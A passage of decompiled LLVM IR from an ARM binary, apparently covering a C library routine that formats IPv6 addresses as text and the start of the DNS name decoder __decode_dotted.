  %v1_2e25c = add i32 %v0_2e25c, 2
  store i32 %v1_2e25c, i32* %r0.global-to-local, align 4
  store i32 %v2_2e260, i32* %r1.global-to-local, align 4
  %v4_2e264 = mul i32 %v3_2e258, 4
  %v5_2e264 = add i32 %v4_2e264, %v2_2e260
  %v7_2e268 = icmp eq i32 %v1_2e25c, 15
  store i1 %v7_2e268, i1* %cpsr_z.global-to-local, align 1
  %v2_2e26c = add i32 %v5_2e264, -32
  %v3_2e26c = inttoptr i32 %v2_2e26c to i32*
  store i32 %v5_2e254, i32* %v3_2e26c, align 4
  %v7_2e270 = icmp sgt i32 %v1_2e25c, 15
  br i1 %v7_2e270, label %dec_label_pc_2e274, label %dec_label_pc_2e244.dec_label_pc_2e244_crit_edge

dec_label_pc_2e244.dec_label_pc_2e244_crit_edge:  ; preds = %dec_label_pc_2e244
  %v0_2e244.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e244

dec_label_pc_2e274:                               ; preds = %dec_label_pc_2e244
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2e28c

dec_label_pc_2e28c:                               ; preds = %dec_label_pc_2e274, %dec_label_pc_2e2d8
  %v0_2e2cc = phi i32 [ -1, %dec_label_pc_2e274 ], [ %v0_2e300, %dec_label_pc_2e2d8 ]
  %v0_2e2bc = phi i32 [ -1, %dec_label_pc_2e274 ], [ %v0_2e2ec, %dec_label_pc_2e2d8 ]
  %v0_2e2a0 = phi i32 [ -1, %dec_label_pc_2e274 ], [ %v0_2e2a07, %dec_label_pc_2e2d8 ]
  %v0_2e2d8 = phi i32 [ 0, %dec_label_pc_2e274 ], [ %v1_2e2d8, %dec_label_pc_2e2d8 ]
  %v4_2e290 = mul nuw nsw i32 %v0_2e2d8, 4
  %v5_2e290 = add i32 %v4_2e290, %v2_2e260
  %v1_2e294 = add i32 %v5_2e290, -32
  %v2_2e294 = inttoptr i32 %v1_2e294 to i32*
  %v3_2e294 = load i32, i32* %v2_2e294, align 4
  %v2_2e298 = icmp eq i32 %v3_2e294, 0
  %v7_2e2a0 = icmp eq i32 %v0_2e2a0, -1
  br i1 %v2_2e298, label %dec_label_pc_2e2a0, label %dec_label_pc_2e2b4

dec_label_pc_2e2a0:                               ; preds = %dec_label_pc_2e28c
  br i1 %v7_2e2a0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2e2a0
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_2e2d8

.thread:                                          ; preds = %dec_label_pc_2e2a0
  %v1_2e2ac.pre = load i32, i32* @r4, align 4
  %v2_2e2ac = add i32 %v1_2e2ac.pre, 1
  store i32 %v2_2e2ac, i32* @r4, align 4
  br label %dec_label_pc_2e2d8

dec_label_pc_2e2b4:                               ; preds = %dec_label_pc_2e28c
  br i1 %v7_2e2a0, label %dec_label_pc_2e2d8, label %dec_label_pc_2e2bc

dec_label_pc_2e2bc:                               ; preds = %dec_label_pc_2e2b4
  %v7_2e2bc = icmp eq i32 %v0_2e2bc, -1
  %v0_2e2d0.pre = load i32, i32* @r4, align 4
  %v1_2e2c4 = load i32, i32* @r7, align 4
  %v7_2e2c8 = icmp sgt i32 %v0_2e2d0.pre, %v1_2e2c4
  %or.cond = or i1 %v7_2e2bc, %v7_2e2c8
  br i1 %or.cond, label %dec_label_pc_2e2cc, label %dec_label_pc_2e2d4

dec_label_pc_2e2cc:                               ; preds = %dec_label_pc_2e2bc
  store i32 %v0_2e2cc, i32* @r6, align 4
  store i32 %v0_2e2d0.pre, i32* @r7, align 4
  br label %dec_label_pc_2e2d4

dec_label_pc_2e2d4:                               ; preds = %dec_label_pc_2e2bc, %dec_label_pc_2e2cc
  %v0_2e2bc12 = phi i32 [ %v0_2e2cc, %dec_label_pc_2e2cc ], [ %v0_2e2bc, %dec_label_pc_2e2bc ]
  br label %dec_label_pc_2e2d8

dec_label_pc_2e2d8:                               ; preds = %bb, %.thread, %dec_label_pc_2e2b4, %dec_label_pc_2e2d4
  %v0_2e300 = phi i32 [ %v0_2e2cc, %.thread ], [ %v0_2e2d8, %bb ], [ %v0_2e2cc, %dec_label_pc_2e2b4 ], [ -1, %dec_label_pc_2e2d4 ]
  %v0_2e2a07 = phi i32 [ %v0_2e2a0, %.thread ], [ %v0_2e2d8, %bb ], [ -1, %dec_label_pc_2e2b4 ], [ -1, %dec_label_pc_2e2d4 ]
  %v0_2e2ec = phi i32 [ %v0_2e2bc, %.thread ], [ %v0_2e2bc, %bb ], [ %v0_2e2bc, %dec_label_pc_2e2b4 ], [ %v0_2e2bc12, %dec_label_pc_2e2d4 ]
  %v1_2e2d8 = add nuw nsw i32 %v0_2e2d8, 1
  store i32 %v1_2e2d8, i32* %r1.global-to-local, align 4
  %v7_2e2e0 = icmp slt i32 %v1_2e2d8, 8
  br i1 %v7_2e2e0, label %dec_label_pc_2e28c, label %dec_label_pc_2e2e4

dec_label_pc_2e2e4:                               ; preds = %dec_label_pc_2e2d8
  %v7_2e2e4 = icmp eq i32 %v0_2e300, -1
  store i1 %v7_2e2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2e2e4, label %dec_label_pc_2e2e4.dec_label_pc_2e304_crit_edge, label %dec_label_pc_2e2ec

dec_label_pc_2e2e4.dec_label_pc_2e304_crit_edge:  ; preds = %dec_label_pc_2e2e4
  %v1_2e328.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2e304

dec_label_pc_2e2ec:                               ; preds = %dec_label_pc_2e2e4
  %v7_2e2ec = icmp eq i32 %v0_2e2ec, -1
  store i1 %v7_2e2ec, i1* %cpsr_z.global-to-local, align 1
  %v0_2e2fc.pre = load i32, i32* @r4, align 4
  br i1 %v7_2e2ec, label %dec_label_pc_2e2fc, label %dec_label_pc_2e2f4

dec_label_pc_2e2f4:                               ; preds = %dec_label_pc_2e2ec
  %v1_2e2f4 = load i32, i32* @r7, align 4
  %v9_2e2f4 = icmp eq i32 %v0_2e2fc.pre, %v1_2e2f4
  store i1 %v9_2e2f4, i1* %cpsr_z.global-to-local, align 1
  %v7_2e2f8 = icmp sgt i32 %v0_2e2fc.pre, %v1_2e2f4
  br i1 %v7_2e2f8, label %dec_label_pc_2e2fc, label %dec_label_pc_2e304

dec_label_pc_2e2fc:                               ; preds = %dec_label_pc_2e2ec, %dec_label_pc_2e2f4
  store i32 %v0_2e2fc.pre, i32* @r7, align 4
  store i32 %v0_2e300, i32* @r6, align 4
  br label %dec_label_pc_2e304

dec_label_pc_2e304:                               ; preds = %dec_label_pc_2e2e4.dec_label_pc_2e304_crit_edge, %dec_label_pc_2e2f4, %dec_label_pc_2e2fc
  %v1_2e328.pre = phi i32 [ %v1_2e2f4, %dec_label_pc_2e2f4 ], [ %v1_2e328.pre.pre, %dec_label_pc_2e2e4.dec_label_pc_2e304_crit_edge ], [ %v0_2e2fc.pre, %dec_label_pc_2e2fc ]
  %v0_2e304 = phi i32 [ %v0_2e2ec, %dec_label_pc_2e2f4 ], [ %v0_2e2ec, %dec_label_pc_2e2e4.dec_label_pc_2e304_crit_edge ], [ %v0_2e300, %dec_label_pc_2e2fc ]
  %v7_2e304 = icmp eq i32 %v0_2e304, -1
  store i1 %v7_2e304, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2e304, label %dec_label_pc_2e304._crit_edge, label %dec_label_pc_2e30c

dec_label_pc_2e30c:                               ; preds = %dec_label_pc_2e304
  %v7_2e30c = icmp eq i32 %v1_2e328.pre, 1
  store i1 %v7_2e30c, i1* %cpsr_z.global-to-local, align 1
  %v7_2e310 = icmp slt i32 %v1_2e328.pre, 2
  br i1 %v7_2e310, label %bb54, label %dec_label_pc_2e304._crit_edge

bb54:                                             ; preds = %dec_label_pc_2e30c
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_2e304._crit_edge

dec_label_pc_2e304._crit_edge:                    ; preds = %dec_label_pc_2e304, %dec_label_pc_2e30c, %bb54
  %v0_2e328 = phi i32 [ %v0_2e304, %dec_label_pc_2e30c ], [ -1, %bb54 ], [ %v0_2e304, %dec_label_pc_2e304 ]
  %v2_2e318 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_2e318, i32* @r4, align 4
  %v0_2e31c = load i32, i32* @r5, align 4
  %v2_2e31c = add i32 %v0_2e31c, -33248
  store i32 %v2_2e31c, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_2e328 = add i32 %v0_2e328, %v1_2e328.pre
  store i32 %v2_2e328, i32* @sl, align 4
  %v9_2e388 = icmp eq i32 %tmp, 65535
  %v7_2e33068 = icmp eq i32 %v0_2e328, -1
  store i1 %v7_2e33068, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2e330

dec_label_pc_2e330:                               ; preds = %dec_label_pc_2e304._crit_edge, %dec_label_pc_2e3e0
  %v7_2e33072 = phi i1 [ %v7_2e33068, %dec_label_pc_2e304._crit_edge ], [ %v7_2e330, %dec_label_pc_2e3e0 ]
  %v0_2e35c71 = phi i32 [ 0, %dec_label_pc_2e304._crit_edge ], [ %v1_2e3e0, %dec_label_pc_2e3e0 ]
  %v1_2e34870 = phi i32 [ %v0_2e328, %dec_label_pc_2e304._crit_edge ], [ %v0_2e330.pre, %dec_label_pc_2e3e0 ]
  %v2_2e36069 = phi i32 [ %v2_2e318, %dec_label_pc_2e304._crit_edge ], [ %v3_2e34c29, %dec_label_pc_2e3e0 ]
  br i1 %v7_2e33072, label %dec_label_pc_2e354, label %dec_label_pc_2e338

dec_label_pc_2e338:                               ; preds = %dec_label_pc_2e330
  %v9_2e338 = icmp eq i32 %v0_2e35c71, %v1_2e34870
  store i1 %v9_2e338, i1* %cpsr_z.global-to-local, align 1
  %v5_2e33c = icmp slt i32 %v0_2e35c71, %v1_2e34870
  br i1 %v5_2e33c, label %dec_label_pc_2e354, label %dec_label_pc_2e340

dec_label_pc_2e340:                               ; preds = %dec_label_pc_2e338
  %v1_2e340 = load i32, i32* @sl, align 4
  %v9_2e340 = icmp eq i32 %v0_2e35c71, %v1_2e340
  store i1 %v9_2e340, i1* %cpsr_z.global-to-local, align 1
  %v6_2e344 = icmp slt i32 %v0_2e35c71, %v1_2e340
  br i1 %v6_2e344, label %dec_label_pc_2e348, label %dec_label_pc_2e354

dec_label_pc_2e348:                               ; preds = %dec_label_pc_2e340
  store i1 %v9_2e338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2e338, label %bb56, label %dec_label_pc_2e3e0

bb56:                                             ; preds = %dec_label_pc_2e348
  %v1_2e34c = load i32, i32* @sb, align 4
  %v2_2e34c = trunc i32 %v1_2e34c to i8
  %v4_2e34c = inttoptr i32 %v2_2e36069 to i8*
  store i8 %v2_2e34c, i8* %v4_2e34c, align 1
  %v5_2e34c = load i32, i32* @r4, align 4
  %v6_2e34c = add i32 %v5_2e34c, 1
  store i32 %v6_2e34c, i32* @r4, align 4
  br label %dec_label_pc_2e3e0

dec_label_pc_2e354:                               ; preds = %dec_label_pc_2e340, %dec_label_pc_2e338, %dec_label_pc_2e330
  %v2_2e354 = icmp eq i32 %v0_2e35c71, 0
  store i1 %v2_2e354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2e354, label %dec_label_pc_2e3c4, label %dec_label_pc_2e35c

dec_label_pc_2e35c:                               ; preds = %dec_label_pc_2e354
  %v7_2e35c = icmp eq i32 %v0_2e35c71, 6
  store i1 %v7_2e35c, i1* %cpsr_z.global-to-local, align 1
  %v0_2e360 = load i32, i32* @sb, align 4
  %v1_2e360 = trunc i32 %v0_2e360 to i8
  %v3_2e360 = inttoptr i32 %v2_2e36069 to i8*
  store i8 %v1_2e360, i8* %v3_2e360, align 1
  %v4_2e360 = load i32, i32* @r4, align 4
  %v5_2e360 = add i32 %v4_2e360, 1
  store i32 %v5_2e360, i32* @r4, align 4
  %v0_2e364 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2e364, label %dec_label_pc_2e368, label %dec_label_pc_2e3c4

dec_label_pc_2e368:                               ; preds = %dec_label_pc_2e35c
  %v0_2e368 = load i32, i32* @r6, align 4
  %v2_2e368 = icmp eq i32 %v0_2e368, 0
  store i1 %v2_2e368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2e368, label %dec_label_pc_2e370, label %dec_label_pc_2e3c4

dec_label_pc_2e370:                               ; preds = %dec_label_pc_2e368
  %v0_2e370 = load i32, i32* @r7, align 4
  %v7_2e370 = icmp eq i32 %v0_2e370, 6
  store i1 %v7_2e370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2e370, label %dec_label_pc_2e390, label %dec_label_pc_2e378

dec_label_pc_2e378:                               ; preds = %dec_label_pc_2e370
  %v7_2e378 = icmp eq i32 %v0_2e370, 5
  store i1 %v7_2e378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2e378, label %dec_label_pc_2e380, label %dec_label_pc_2e3c4

dec_label_pc_2e380:                               ; preds = %dec_label_pc_2e378
  store i32 65535, i32* %r1.global-to-local, align 4
  store i1 %v9_2e388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2e388, label %dec_label_pc_2e390, label %dec_label_pc_2e3c4

dec_label_pc_2e390:                               ; preds = %dec_label_pc_2e380, %dec_label_pc_2e370
  %v2_2e394 = sub i32 %v2_2e260, %v5_2e360
  store i32 %v5_2e360, i32* %r1.global-to-local, align 4
  %v0_2e39c = load i32, i32* @r8, align 4
  %v1_2e39c = add i32 %v0_2e39c, 12
  store i32 %v1_2e39c, i32* %r0.global-to-local, align 4
  %v1_2e3a0 = add i32 %v2_2e394, -32
  %v3_2e3a4 = call i32 @inet_ntop4(i32 %v1_2e39c, i32 %v5_2e360, i32 %v1_2e3a0)
  store i32 %v3_2e3a4, i32* %r0.global-to-local, align 4
  %v2_2e3a8 = icmp eq i32 %v3_2e3a4, 0
  store i1 %v2_2e3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2e3a8, label %bb57, label %dec_label_pc_2e3b4

bb57:                                             ; preds = %dec_label_pc_2e390
  %v1_2e3ac = load i32, i32* @r6, align 4
  store i32 %v1_2e3ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2e464

dec_label_pc_2e3b4:                               ; preds = %dec_label_pc_2e390
  %v0_2e3b4 = load i32, i32* @r4, align 4
  %v1_2e3b4 = inttoptr i32 %v0_2e3b4 to i8*
  store i32 %v0_2e3b4, i32* %r0.global-to-local, align 4
  %v3_2e3b8 = call i32 @strlen(i8* %v1_2e3b4)
  store i32 %v3_2e3b8, i32* %r0.global-to-local, align 4
  %v0_2e3bc = load i32, i32* @r4, align 4
  %v2_2e3bc = add i32 %v0_2e3bc, %v3_2e3b8
  store i32 %v2_2e3bc, i32* @r4, align 4
  %v0_2e3f4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2e3f4

dec_label_pc_2e3c4:                               ; preds = %dec_label_pc_2e380, %dec_label_pc_2e378, %dec_label_pc_2e368, %dec_label_pc_2e35c, %dec_label_pc_2e354
  %v0_2e3cc = phi i32 [ %v5_2e360, %dec_label_pc_2e380 ], [ %v5_2e360, %dec_label_pc_2e378 ], [ %v5_2e360, %dec_label_pc_2e368 ], [ %v5_2e360, %dec_label_pc_2e35c ], [ %v2_2e36069, %dec_label_pc_2e354 ]
  store i32 %v2_2e260, i32* @lr, align 4
  store i32 %v0_2e3cc, i32* @r0, align 4
  %v0_2e3d4 = load i32, i32* @fp, align 4
  store i32 %v0_2e3d4, i32* %r1.global-to-local, align 4
  %v2_2e3d8 = call i32 @sprintf(i32 %v0_2e3cc, i32 %v0_2e3d4)
  store i32 %v2_2e3d8, i32* %r0.global-to-local, align 4
  %v0_2e3dc = load i32, i32* @r4, align 4
  %v2_2e3dc = add i32 %v0_2e3dc, %v2_2e3d8
  store i32 %v2_2e3dc, i32* @r4, align 4
  br label %dec_label_pc_2e3e0

dec_label_pc_2e3e0:                               ; preds = %bb56, %dec_label_pc_2e348, %dec_label_pc_2e3c4
  %v3_2e34c29 = phi i32 [ %v6_2e34c, %bb56 ], [ %v2_2e36069, %dec_label_pc_2e348 ], [ %v2_2e3dc, %dec_label_pc_2e3c4 ]
  %v0_2e3e0 = load i32, i32* @r5, align 4
  %v1_2e3e0 = add i32 %v0_2e3e0, 1
  store i32 %v1_2e3e0, i32* @r5, align 4
  %v0_2e330.pre = load i32, i32* @r6, align 4
  %v7_2e3e8 = icmp slt i32 %v1_2e3e0, 8
  %v7_2e330 = icmp eq i32 %v0_2e330.pre, -1
  store i1 %v7_2e330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2e3e8, label %dec_label_pc_2e330, label %dec_label_pc_2e3ec

dec_label_pc_2e3ec:                               ; preds = %dec_label_pc_2e3e0
  br i1 %v7_2e330, label %.thread2, label %dec_label_pc_2e3f4

dec_label_pc_2e3f4:                               ; preds = %dec_label_pc_2e3ec, %dec_label_pc_2e3b4
  %v3_2e400 = phi i32 [ %v3_2e34c29, %dec_label_pc_2e3ec ], [ %v2_2e3bc, %dec_label_pc_2e3b4 ]
  %v0_2e3f4 = phi i32 [ %v0_2e330.pre, %dec_label_pc_2e3ec ], [ %v0_2e3f4.pre, %dec_label_pc_2e3b4 ]
  %v1_2e3f4 = load i32, i32* @r7, align 4
  %v2_2e3f4 = add i32 %v1_2e3f4, %v0_2e3f4
  %v7_2e3f8 = icmp eq i32 %v2_2e3f4, 8
  store i1 %v7_2e3f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2e3f8, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_2e3f4
  %v4_2e400 = inttoptr i32 %v3_2e400 to i8*
  store i8 58, i8* %v4_2e400, align 1
  %v5_2e400 = load i32, i32* @r4, align 4
  %v6_2e400 = add i32 %v5_2e400, 1
  store i32 %v6_2e400, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2e3f4, %dec_label_pc_2e3ec, %bb58
  %v2_2e408 = phi i32 [ %v3_2e400, %dec_label_pc_2e3f4 ], [ %v3_2e34c29, %dec_label_pc_2e3ec ], [ %v6_2e400, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_2e408 = inttoptr i32 %v2_2e408 to i8*
  store i8 0, i8* %v3_2e408, align 1
  %v4_2e408 = load i32, i32* @r4, align 4
  %v5_2e408 = add i32 %v4_2e408, 1
  store i32 %v2_2e318, i32* @r1, align 4
  %v2_2e410 = load i32, i32* %stack_var_-128, align 4
  %v2_2e414 = sub i32 %v5_2e408, %v2_2e318
  %v9_2e418 = icmp eq i32 %v2_2e414, %v2_2e410
  store i1 %v9_2e418, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_2e414, %v2_2e410
  br i1 %tmp75, label %dec_label_pc_2e420, label %dec_label_pc_2e43c

dec_label_pc_2e420:                               ; preds = %.thread2
  %v0_2e424 = call i32 @__aeabi_read_tp()
  store i32 %v0_2e424, i32* %r0.global-to-local, align 4
  %v3_2e428 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2e428 = sext i16 %v3_2e428 to i32
  %v0_2e430 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2e430, i32* %r1.global-to-local, align 4
  %v3_2e434 = add i32 %v4_2e428, %v0_2e424
  %v4_2e434 = inttoptr i32 %v3_2e434 to i32*
  store i32 28, i32* %v4_2e434, align 4
  %v0_2e464.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2e464

dec_label_pc_2e43c:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_2e440 = inttoptr i32 %arg3 to i8*
  %v3_2e440 = call i32 @strcpy(i8* %v2_2e440, i32 %v2_2e318)
  br label %dec_label_pc_2e444

dec_label_pc_2e444:                               ; preds = %dec_label_pc_2e21c, %dec_label_pc_2e43c
  %storemerge = phi i32 [ %v3_2e228, %dec_label_pc_2e21c ], [ %v3_2e440, %dec_label_pc_2e43c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2e464

dec_label_pc_2e44c:                               ; preds = %dec_label_pc_2e210
  %v0_2e450 = call i32 @__aeabi_read_tp()
  store i32 %v0_2e450, i32* %r0.global-to-local, align 4
  %v3_2e454 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2e454 = sext i16 %v3_2e454 to i32
  %v3_2e45c = add i32 %v4_2e454, %v0_2e450
  %v4_2e45c = inttoptr i32 %v3_2e45c to i32*
  store i32 97, i32* %v4_2e45c, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2e464

dec_label_pc_2e464:                               ; preds = %bb57, %dec_label_pc_2e444, %dec_label_pc_2e420, %dec_label_pc_2e44c
  %v0_2e464 = phi i32 [ %v1_2e3ac, %bb57 ], [ %storemerge, %dec_label_pc_2e444 ], [ %v0_2e464.pre, %dec_label_pc_2e420 ], [ 0, %dec_label_pc_2e44c ]
  store i32 %v0_2e464, i32* %r0.global-to-local, align 4
  store i32 %v6_2e1ec, i32* %r5.global-to-local, align 4
  ret i32 %v0_2e464

; uselistorder directives
  uselistorder i32 %v0_2e464, { 1, 0 }
  uselistorder i1 %v7_2e330, { 2, 0, 1 }
  uselistorder i32 %v0_2e330.pre, { 1, 0, 2 }
  uselistorder i32 %v1_2e3e0, { 0, 2, 1 }
  uselistorder i32 %v0_2e3cc, { 1, 0 }
  uselistorder i32 %v0_2e3b4, { 1, 0 }
  uselistorder i32 %v5_2e360, { 3, 4, 5, 6, 2, 1, 0, 7 }
  uselistorder i1 %v9_2e338, { 1, 0, 2 }
  uselistorder i32 %v2_2e36069, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2e35c71, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_2e33068, { 1, 0 }
  uselistorder i32 %v2_2e318, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_2e328, { 1, 0, 2 }
  uselistorder i1 %v7_2e304, { 1, 0 }
  uselistorder i32 %v0_2e304, { 1, 2, 0 }
  uselistorder i32 %v1_2e328.pre, { 2, 0, 1 }
  uselistorder i32 %v0_2e2fc.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_2e2ec, { 1, 0 }
  uselistorder i1 %v7_2e2e4, { 1, 0 }
  uselistorder i32 %v1_2e2d8, { 1, 2, 0 }
  uselistorder i32 %v0_2e2ec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2e300, { 1, 2, 0, 3 }
  uselistorder i1 %v7_2e2a0, { 1, 0 }
  uselistorder i32 %v0_2e2d8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_2e2bc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_2e2cc, { 3, 1, 0, 2 }
  uselistorder i32 %v1_2e25c, { 1, 0, 2 }
  uselistorder i32 %v2_2e244, { 1, 0 }
  uselistorder i32 %v0_2e25c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_2e260, { 3, 2, 0, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 5, 6, 8, 7, 13, 9, 10, 11, 12, 15, 14, 16, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 23, 14, 15, 16, 17, 18, 22, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 8, 1, 0, 9, 7, 2, 3, 4 }
  uselistorder i8 58, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @sprintf, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_2e464, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_2e444, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2e3e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2e330, { 1, 0 }
  uselistorder label %dec_label_pc_2e304._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2e304, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2e2fc, { 1, 0 }
  uselistorder label %dec_label_pc_2e2d8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_2e2d4, { 1, 0 }
  uselistorder label %dec_label_pc_2e28c, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_2e488 = load i32, i32* @r5, align 4
  %v0_2e48c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2e48c, i32* %sl.global-to-local, align 4
  %v2_2e48c = icmp eq i32 %v0_2e48c, 0
  br i1 %v2_2e48c, label %.thread30, label %dec_label_pc_2e4b4.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_2e574

dec_label_pc_2e4b4.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_2e4b44 = load i32, i32* @r1, align 4
  %v6_2e4b814 = icmp slt i32 %v0_2e4b44, %arg2
  br i1 %v6_2e4b814, label %dec_label_pc_2e4bc.preheader, label %dec_label_pc_2e574

dec_label_pc_2e4bc.preheader:                     ; preds = %dec_label_pc_2e4b4.preheader
  %v2_2e4bc51 = add i32 %v0_2e48c, %v0_2e4b44
  %v3_2e4bc52 = inttoptr i32 %v2_2e4bc51 to i8*
  %v4_2e4bc53 = load i8, i8* %v3_2e4bc52, align 1
  %v6_2e4bc54 = zext i8 %v4_2e4bc53 to i32
  store i32 %v6_2e4bc54, i32* @r4, align 4
  %v2_2e4c055 = icmp eq i8 %v4_2e4bc53, 0
  br i1 %v2_2e4c055, label %bb49, label %dec_label_pc_2e4c8

dec_label_pc_2e4b0:                               ; preds = %bb48, %bb44
  %v1_2e4b4 = phi i32 [ %v1_2e4b4.pre, %bb48 ], [ %v1_2e4e059, %bb44 ]
  %v0_2e4b4 = phi i32 [ %v0_2e4b4.pre, %bb48 ], [ %v5_2e4f8, %bb44 ]
  %v0_2e4b0 = phi i32 [ %v0_2e4b0.pre, %bb48 ], [ %v0_2e4fc60, %bb44 ]
  store i32 %v0_2e4b0, i32* %r0.global-to-local, align 4
  %v6_2e4b8 = icmp slt i32 %v0_2e4b4, %v1_2e4b4
  br i1 %v6_2e4b8, label %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge, label %dec_label_pc_2e574

dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge:  ; preds = %dec_label_pc_2e4b0
  %v0_2e4bc.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_2e4bc = add i32 %v0_2e4bc.pre, %v0_2e4b4
  %v3_2e4bc = inttoptr i32 %v2_2e4bc to i8*
  %v4_2e4bc = load i8, i8* %v3_2e4bc, align 1
  %v6_2e4bc = zext i8 %v4_2e4bc to i32
  store i32 %v6_2e4bc, i32* @r4, align 4
  %v2_2e4c0 = icmp eq i8 %v4_2e4bc, 0
  %v0_2e560 = load i32, i32* @ip, align 4
  %v2_2e560 = icmp eq i32 %v0_2e560, 0
  br i1 %v2_2e4c0, label %dec_label_pc_2e560, label %dec_label_pc_2e4c8

dec_label_pc_2e4c8:                               ; preds = %dec_label_pc_2e4bc.preheader, %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge
  %v2_2e56066 = phi i1 [ %v2_2e560, %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge ], [ false, %dec_label_pc_2e4bc.preheader ]
  %v0_2e56064 = phi i32 [ %v0_2e560, %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge ], [ 1, %dec_label_pc_2e4bc.preheader ]
  %v6_2e4bc63 = phi i32 [ %v6_2e4bc, %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge ], [ %v6_2e4bc54, %dec_label_pc_2e4bc.preheader ]
  %v0_2e4e862 = phi i32 [ %v0_2e4bc.pre, %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge ], [ %v0_2e48c, %dec_label_pc_2e4bc.preheader ]
  %v0_2e4d861 = phi i32 [ %v0_2e4b4, %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge ], [ %v0_2e4b44, %dec_label_pc_2e4bc.preheader ]
  %v0_2e4fc60 = phi i32 [ %v0_2e4b0, %dec_label_pc_2e4b0.dec_label_pc_2e4bc_crit_edge ], [ 0, %dec_label_pc_2e4bc.preheader ]
